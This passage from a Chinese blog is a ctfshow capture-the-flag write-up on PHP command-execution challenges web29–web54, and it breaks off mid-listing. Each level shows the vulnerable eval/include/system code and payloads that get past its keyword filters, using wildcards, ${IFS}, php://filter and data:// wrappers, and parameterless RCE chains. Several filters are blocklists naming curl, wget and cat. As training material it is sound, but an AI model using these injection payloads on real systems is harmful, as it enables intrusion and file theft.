<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="ctfshow web, Ethe&#39;s blog">
    <meta name="description" content="命令执行web29&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;c&amp;#39;]))&amp;#123;
    $c &amp;#x3D; $_GET[&amp;#39;c&amp;#39;];
    if(!preg">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>ctfshow web | Ethe&#39;s blog</title>
    <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/my.css">

    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/jquery/jquery-3.6.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Ethe&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Ethe&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">ctfshow web</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: scroll;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }
    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-04-24
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-11-10
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    40.7k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    209 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;system(ls);
?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;通配符直接绕</code></pre>

<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo &#96;ls&#96;;
?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;反引号内联执行</code></pre>

<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo&#96;ls&#96;;
?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;过滤了空格，但是可以用%09绕过
看hint感觉预期解应该是无参数的rce 
?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));
?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>

<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;php的最后一行代码可以不用分号分行
c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;用短标签再写段php也一样</code></pre>

<p>php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</p>
<p>还可以用data伪协议</p>
<p>data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。<code>data:text/plain</code>是嵌入文本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424163928570.png" alt="image-20220424163928570"></p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">get传参
?c&#x3D;include%0a$_POST[1]?&gt;
post内容
1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;);</code></pre>

<p>官方payload</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;感觉中间这个nice没啥用</code></pre>

<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>同32</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>同32</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>同32</p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>同32，就是注意不要用数字当参数名</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>直接data伪协议读取</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);</code></pre>

<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>data伪协议加短标签</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;);</code></pre>

<p>至于利用日志文件的部分，不知道为什么只有用短标签的时候才能成功</p>
<p>首先用bp避免箭头符号的转义（这里也是只有作为c的值且用短标签的时候才会不转义，web37也一样</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172239712.png" alt="image-20220424172239712"></p>
<p>然后利用文件包含访问nginx的日志文件/var/log/nginx/access.log</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172302924.png" alt="image-20220424172302924"></p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        include($c.&quot;.php&quot;);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>尖括号闭合掉后面的.php就行了</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt;</code></pre>

<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https:&#x2F;&#x2F;ctfer.com
*&#x2F;


if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<p>可以用无参数rce，因为这里过滤的是中文的括号</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>

<p>或者利用session,但是</p>
<pre class="language-php" data-language="php"><code class="language-php">利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session）
受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</code></pre>

<p>所以题目环境能做到的也就只有个ls和whoami之类的命令</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175319501.png" alt="image-20220424175319501"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175412309.png" alt="image-20220424175412309"></p>
<p>本来还可以利用base64，但是题目把数字也过滤了，不能进行解码，只能用本地环境复现了</p>
<p>我这里直接贴了其他师傅的图片了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/b041616efce14720b67c1b942dc4eded.png" alt="在这里插入图片描述"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/4f4e320ad873468aa563357f66b0ac13.png" alt="在这里插入图片描述"></p>
<p><strong>还有一种姿势</strong></p>
<pre class="language-none"><code class="language-none">get_defined_vars() 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
array_pop() 是删除并返回数组最后一个元素
current() 返回数组中的当前元素的值。
next() 返回数组中的下一个元素的值。</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180340722.png" alt="image-20220424180340722"></p>
<p>我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180605396.png" alt="image-20220424180605396"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180751358.png" alt="image-20220424180751358"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180829456.png" alt="image-20220424180829456"></p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>或运算绕过，直接用羽师傅的脚本也行。</p>
<p>不过要是直接输payload要在bp里，应该是hackbar的编码有点问题</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424182050495.png" alt="image-20220424182050495"></p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
  $c&#x3D;$_GET[&#39;c&#39;];
  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
&#125;else&#123;
  highlight_file(__FILE__);
&#125;</code></pre>

<p>&gt; 代表重定向到哪里<br>/dev/null 代表空设备文件<br>2&gt; 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>1 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1</p>
<p>本题语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<p>补充：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p>
<p>利用%0a换行把它换下去或者其他的语句来截断</p>
<pre class="language-none"><code class="language-none">?c&#x3D;cat flag.php%0a
?c&#x3D;cat flag.php||
?c&#x3D;cat flag.php%26
?c&#x3D;cat flag.php%26%26
?c&#x3D;cat flag.php;</code></pre>

<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload基本上和42的一样，就是把cat换成uniq，tac，nl之类的</p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>flag也被过滤了，那就在web43的基础上加上通配符</p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格也被过滤了</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_matchd(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>用${IFS}替代空格</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;nl$&#123;IFS&#125;f*||</code></pre>

<h2 id="web46-51"><a href="#web46-51" class="headerlink" title="web46-51"></a>web46-51</h2><pre class="language-none"><code class="language-none">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>用&lt;或&lt;&gt;代替空格，用‘’截断flag关键字</p>
<pre class="language-none"><code class="language-none">c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php||</code></pre>

<p><strong>web47</strong></p>
<p>和46一样的</p>
<pre class="language-php" data-language="php"><code class="language-php">nl&lt;&gt;fla&#39;&#39;g.php||</code></pre>

<p><strong>web48</strong></p>
<p>同46</p>
<pre class="language-none"><code class="language-none">more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看 
file -f:报错出具体内容 
grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</code></pre>

<p><strong>web49</strong></p>
<p>同46</p>
<p>这个也行</p>
<pre class="language-none"><code class="language-none">?c&#x3D;nl%09fl&quot;&quot;ag.php%0a</code></pre>

<p><strong>web50</strong></p>
<p>同46</p>
<p><strong>web51</strong></p>
<p>同46</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>过滤了大于小于，但是没过滤$符</p>
<pre class="language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></pre>

<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre class="language-none"><code class="language-none">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        echo($c);
        $d &#x3D; system($c);
        echo &quot;&lt;br&gt;&quot;.$d;
    &#125;else&#123;
        echo &#39;no&#39;;
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></pre>

<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
